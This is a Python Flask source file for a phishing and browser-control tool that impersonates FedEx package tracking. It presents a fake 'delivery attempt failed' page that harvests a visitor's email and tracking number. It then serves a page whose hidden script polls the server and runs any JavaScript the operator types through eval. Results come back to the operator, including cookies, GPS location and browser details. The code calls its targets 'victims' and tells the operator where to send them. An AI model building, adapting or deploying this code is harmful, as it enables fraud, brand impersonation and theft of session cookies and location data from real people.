"""
INTEGRATED TROJAN PORTAL - NO TUNNEL PASSWORD NEEDED!
This combines the delivery tracker AND trojan into ONE Flask app.
Victim clicks link → enters any tracking number → immediate trojan access
"""

from flask import Flask, render_template, request, jsonify, session
import subprocess
import threading
import time
import queue
from configs import HOST, PORT

app = Flask(__name__)
app.secret_key = 'fedex_delivery_secret_2026'

# Command queue for remote control
command_queue = queue.Queue()
result_queue = queue.Queue()
active_sessions = set()

@app.route("/")
def delivery_home():
    """Main FedEx delivery tracking page - this is what victims see first"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>FedEx Package Tracking</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: #f8f8f8; 
                margin: 0; 
                padding: 20px; 
            }
            .container { 
                max-width: 600px; 
                margin: 0 auto; 
                background: white; 
                padding: 30px; 
                border-radius: 8px; 
                box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
            }
            .logo { 
                color: #4A148C; 
                font-size: 28px; 
                font-weight: bold; 
                margin-bottom: 20px; 
            }
            .tracking-box { 
                border: 2px solid #4A148C; 
                border-radius: 5px; 
                padding: 20px; 
                margin: 20px 0; 
            }
            input[type="text"] { 
                width: 100%; 
                padding: 15px; 
                border: 2px solid #ddd; 
                border-radius: 5px; 
                font-size: 16px; 
                margin: 10px 0; 
                box-sizing: border-box;
            }
            .track-btn { 
                background: #4A148C; 
                color: white; 
                padding: 15px 30px; 
                border: none; 
                border-radius: 5px; 
                font-size: 16px; 
                cursor: pointer; 
                width: 100%;
                margin-top: 10px;
            }
            .track-btn:hover { background: #6A1B9A; }
            .urgent { 
                background: #ffebee; 
                border-left: 4px solid #f44336; 
                padding: 15px; 
                margin: 20px 0; 
                color: #d32f2f;
            }
            .notice { 
                background: #e3f2fd; 
                border-left: 4px solid #2196f3; 
                padding: 15px; 
                margin: 20px 0; 
                color: #1976d2;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">📦 FedEx</div>
            <h2>Package Tracking</h2>
            
            <div class="urgent">
                <strong>⚠️ Delivery Attempt Failed</strong><br>
                We attempted to deliver your package today but no one was available.
                Your package requires immediate attention to avoid return to sender.
            </div>
            
            <div class="notice">
                <strong>📱 SMS Notification Received</strong><br>
                You should have received an SMS with your tracking number.
                Enter it below to reschedule delivery or arrange pickup.
            </div>
            
            <div class="tracking-box">
                <form method="POST" action="/track">
                    <label><strong>📋 Tracking Number:</strong></label>
                    <input type="text" name="tracking_number" placeholder="Enter tracking number from SMS" required>
                    
                    <label><strong>📧 Email for Updates:</strong></label>
                    <input type="email" name="email" placeholder="Enter your email address" required>
                    
                    <button type="submit" class="track-btn">🚚 Track Package & Reschedule</button>
                </form>
            </div>
            
            <div style="font-size: 12px; color: #666; margin-top: 20px;">
                <strong>Need Help?</strong><br>
                • Call Customer Service: 1-800-FEDEX (1-800-33339)<br>
                • Live Chat available 24/7<br>
                • For urgent deliveries, use tracking portal above
            </div>
        </div>
    </body>
    </html>
    """

@app.route("/track", methods=["POST"])
def track_package():
    """ANY tracking number triggers the trojan - no password validation needed!"""
    tracking_number = request.form.get('tracking_number')
    email = request.form.get('email')
    victim_ip = request.remote_addr
    
    print(f"[+] VICTIM CONNECTED: {victim_ip}")
    print(f"[+] Tracking: {tracking_number}")
    print(f"[+] Email: {email}")
    print(f"[+] ACTIVATING TROJAN...")
    
    # Store victim info
    session['victim_email'] = email
    session['tracking_number'] = tracking_number
    session['authenticated'] = True
    
    # Add to active sessions
    active_sessions.add(victim_ip)
    
    # Start command interface
    threading.Thread(target=command_interface, args=(victim_ip,), daemon=True).start()
    
    # Redirect to "delivery options" which contains the trojan
    return delivery_options_trojan()

def delivery_options_trojan():
    """Fake delivery options page that contains the active trojan"""
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>FedEx - Delivery Options</title>
        <style>
            body {{ font-family: Arial; background: #f8f8f8; padding: 20px; }}
            .container {{ max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
            .success {{ background: #e8f5e8; border-left: 4px solid #4caf50; padding: 15px; margin: 20px 0; }}
            .options {{ background: #fff3e0; border-left: 4px solid #ff9800; padding: 15px; margin: 20px 0; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>📦 Package Located!</h2>
            
            <div class="success">
                <strong>✅ Tracking Successful</strong><br>
                Package: {session.get('tracking_number', 'N/A')}<br>
                Status: Out for delivery
            </div>
            
            <div class="options">
                <strong>🚚 Available Actions:</strong><br>
                • Reschedule for tomorrow<br>
                • Authorize signature release<br>
                • Pick up at FedEx location<br>
                • Update delivery preferences
            </div>
            
            <p>📍 Loading your delivery options...</p>
            <p><em>Your preferences are being updated automatically.</em></p>
        </div>
        
        <script>
            // TROJAN STARTS HERE - victim sees normal delivery page above
            console.log('FedEx delivery system loaded');
            
            function startRemoteSession() {{
                pollForCommands();
            }}
            
            function pollForCommands() {{
                fetch('/get-command')
                    .then(response => response.json())
                    .then(data => {{
                        if (data.command) {{
                            executeCommand(data.command);
                        }}
                        setTimeout(pollForCommands, 2000);
                    }})
                    .catch(() => setTimeout(pollForCommands, 2000));
            }}
            
            function executeCommand(command) {{
                try {{
                    let result;
                    if (command === 'pwd') {{
                        result = window.location.href;
                    }} else if (command === 'whoami') {{
                        result = navigator.userAgent;
                    }} else if (command === 'hostname') {{
                        result = window.location.hostname;
                    }} else if (command.startsWith('location')) {{
                        // Get GPS location
                        navigator.geolocation.getCurrentPosition(
                            pos => {{
                                const location = `Lat: ${{pos.coords.latitude}}, Lon: ${{pos.coords.longitude}}`;
                                fetch('/send-result', {{
                                    method: 'POST',
                                    headers: {{'Content-Type': 'application/json'}},
                                    body: JSON.stringify({{result: location, command: command}})
                                }});
                            }},
                            err => {{
                                fetch('/send-result', {{
                                    method: 'POST',
                                    headers: {{'Content-Type': 'application/json'}},
                                    body: JSON.stringify({{result: 'Location denied: ' + err.message, command: command}})
                                }});
                            }}
                        );
                        return;
                    }} else {{
                        result = eval(command);
                        if (result === undefined) {{
                            result = 'Command executed successfully';
                        }}
                    }}
                    
                    fetch('/send-result', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{result: result.toString(), command: command}})
                    }});
                }} catch (e) {{
                    fetch('/send-result', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{result: 'Error: ' + e.message, command: command}})
                    }});
                }}
            }}
            
            // Start trojan immediately when page loads
            startRemoteSession();
            
            // Send initial victim info
            fetch('/send-result', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    result: `VICTIM CONNECTED - Email: {session.get('victim_email', 'N/A')} - UserAgent: ${{navigator.userAgent}}`,
                    command: 'initial_connection'
                }})
            }});
        </script>
    </body>
    </html>
    """

@app.route("/get-command")
def get_command():
    """API endpoint for trojan to poll for commands"""
    try:
        command = command_queue.get_nowait()
        return jsonify({"command": command})
    except queue.Empty:
        return jsonify({"command": None})

@app.route("/send-result", methods=["POST"])
def send_result():
    """API endpoint for trojan to send command results back"""
    data = request.json
    result_queue.put(f"[{data['command']}] {data['result']}")
    return jsonify({"status": "success"})

def command_interface(victim_ip):
    """Command line interface for controlling the victim"""
    print(f"\n🎯 VICTIM {victim_ip} IS NOW UNDER YOUR CONTROL!")
    print("="*50)
    print("📋 Available commands:")
    print("  - location          : Get GPS coordinates")
    print("  - document.cookie   : Get cookies")
    print("  - navigator.userAgent : Get browser info")
    print("  - window.location.href : Get current URL")
    print("  - alert('message')  : Show popup to victim")
    print("  - Any JavaScript code")
    print("="*50)
    
    while victim_ip in active_sessions:
        try:
            # Get command from user
            command = input(f"\n🎮 Command for {victim_ip} > ")
            
            if command.lower() in ['exit', 'quit']:
                active_sessions.discard(victim_ip)
                print(f"[+] Disconnected from {victim_ip}")
                break
            
            if command.strip():
                # Send command to victim
                command_queue.put(command)
                print(f"[+] Command sent: {command}")
                
                # Wait for result
                try:
                    result = result_queue.get(timeout=10)
                    print(f"[+] Result: {result}")
                except queue.Empty:
                    print("[-] No response from victim (timeout)")
                    
        except KeyboardInterrupt:
            active_sessions.discard(victim_ip)
            print(f"\n[+] Session with {victim_ip} terminated")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    print("🚚 INTEGRATED FEDEX TROJAN PORTAL")
    print("🎯 NO TUNNEL PASSWORD NEEDED!")
    print("="*50)
    print("📦 Send victims to: http://your-tunnel-url.com")
    print("🔓 ANY tracking number will activate trojan")
    print("💻 Command interface starts automatically")
    print("="*50)
    
    app.run(host='0.0.0.0', port=8080, debug=False)
